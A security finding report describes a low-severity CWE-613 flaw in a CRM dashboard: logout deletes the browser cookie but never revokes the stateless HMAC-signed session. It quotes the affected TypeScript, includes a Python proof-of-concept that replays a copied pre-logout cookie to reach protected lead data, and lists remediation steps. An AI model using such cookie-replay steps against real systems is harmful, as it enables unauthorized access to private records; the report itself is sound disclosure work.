# Logout Does Not Invalidate Existing Dashboard Sessions

**ID:** vuln-0003
**Severity:** LOW
**Found:** 2026-08-26 13:50:50 UTC
**Target:** http://127.0.0.1:4321
**Endpoint:** /dashboard/logout
**Method:** POST
**CWE:** CWE-613
**CVSS:** 3.7
**Fix Effort:** Medium

## Description

The dashboard logout flow deletes the browser cookie but does not invalidate the underlying administrator session. A previously copied `crm_session` token remains valid after logout and continues to grant access to protected CRM pages until the cookie expires.

## Evidence

## Impact

An attacker who has obtained a valid `crm_session` cookie can continue accessing protected dashboard content after the legitimate user logs out. The demonstrated impact is continued unauthorized read access to CRM lead data exposed through `/dashboard/leads` and related protected dashboard routes until the session naturally expires.

## Technical Analysis

The dashboard session model is fully stateless. `src/lib/admin-session.ts` creates a token as `expiresAt.nonce.signature` and `verifyAdminSession()` only checks the HMAC and expiration timestamp:

```typescript title=src/lib/admin-session.ts startLineNumber=19 endLineNumber=39
export const createAdminSession = () => {
	const expiresAt = Math.floor(Date.now() / 1000) + ADMIN_SESSION_MAX_AGE;
	const payload = `${expiresAt}.${randomBytes(24).toString("base64url")}`;

	return `${payload}.${sign(payload)}`;
};

export const verifyAdminSession = (token?: string) => {
	if (!token) return false;

	const parts = token.split(".");
	if (parts.length !== 3) return false;

	const [expiresAt, nonce, signature] = parts;
	if (!/^\d+$/.test(expiresAt) || !nonce || !signature) return false;
	if (Number(expiresAt) <= Math.floor(Date.now() / 1000)) return false;

	const expected = Buffer.from(sign(`${expiresAt}.${nonce}`));
	const received = Buffer.from(signature);

	return expected.length === received.length && timingSafeEqual(expected, received);
};
```

`src/pages/dashboard/logout.ts` only deletes the client cookie and never records revocation state:

```typescript title=src/pages/dashboard/logout.ts startLineNumber=9 endLineNumber=16
cookies.delete(
  ADMIN_SESSION_COOKIE,
  {
    path: "/dashboard"
  }
);

return redirect("/dashboard", 303);
```

`src/middleware.ts` then continues to accept any copied token whose signature and expiration remain valid:

```typescript title=src/middleware.ts startLineNumber=51 endLineNumber=55
if (
	isDashboardRoute &&
	!PUBLIC_DASHBOARD_PATHS.has(pathname) &&
	!verifyAdminSession(context.cookies.get(ADMIN_SESSION_COOKIE)?.value)
) {
```

Because there is no server-side session registry or revocation check, logout is only a local browser cleanup action. Any previously copied cookie remains replayable until `ADMIN_SESSION_MAX_AGE` elapses.

## Proof of Concept

1. Authenticate to `/dashboard` with a valid administrator password and capture the issued `crm_session` cookie.
2. Copy the cookie value aside before logging out.
3. Request `/dashboard/leads` with the live cookie and confirm the protected page is accessible.
4. Submit `POST /dashboard/logout` and observe that the active browser jar is cleared.
5. Replay the copied pre-logout `crm_session` value in a fresh request to `/dashboard/leads`.
6. Observe that the protected dashboard still returns `200 OK`, proving logout did not invalidate the issued session.

```python
import requests

BASE = "http://127.0.0.1:4321"
PASSWORD = "<ADMIN_PASSWORD>"
CLIENT_IP = "203.0.113.201"

session = requests.Session()
login_headers = {
    "Origin": BASE,
    "Referer": f"{BASE}/dashboard",
    "X-Real-IP": CLIENT_IP,
}

login = session.post(
    f"{BASE}/dashboard/login",
    data={"password": PASSWORD},
    headers=login_headers,
    allow_redirects=False,
)
login.raise_for_status()

copied_cookie = session.cookies.get("crm_session")
assert copied_cookie, "No admin session cookie was issued"

before_logout = session.get(f"{BASE}/dashboard/leads", allow_redirects=False)
print("before_logout_status=", before_logout.status_code)

logout = session.post(
    f"{BASE}/dashboard/logout",
    headers={
        "Origin": BASE,
        "Referer": f"{BASE}/dashboard/leads",
    },
    allow_redirects=False,
)
print("logout_status=", logout.status_code)
print("logout_set_cookie=", logout.headers.get("Set-Cookie"))

replay = requests.get(
    f"{BASE}/dashboard/leads",
    headers={"Cookie": f"crm_session={copied_cookie}"},
    allow_redirects=False,
)
print("replay_status=", replay.status_code)
```

## Remediation

1. Replace the stateless dashboard cookie with a session model that has server-side revocation state.
2. Register each issued session in a server-side store, keyed by a session identifier carried in the signed cookie.
3. On logout, revoke that server-side record before deleting the browser cookie.
4. In middleware, require both a valid signature and an active, non-revoked server-side session record before granting access to `/dashboard/*`.
5. Fail closed when the session registry cannot be queried, and periodically purge expired session records.

## Assumptions

Assumes the attacker has already obtained a valid `crm_session` cookie before the legitimate user logs out. This finding does not claim a separate path to steal that cookie.
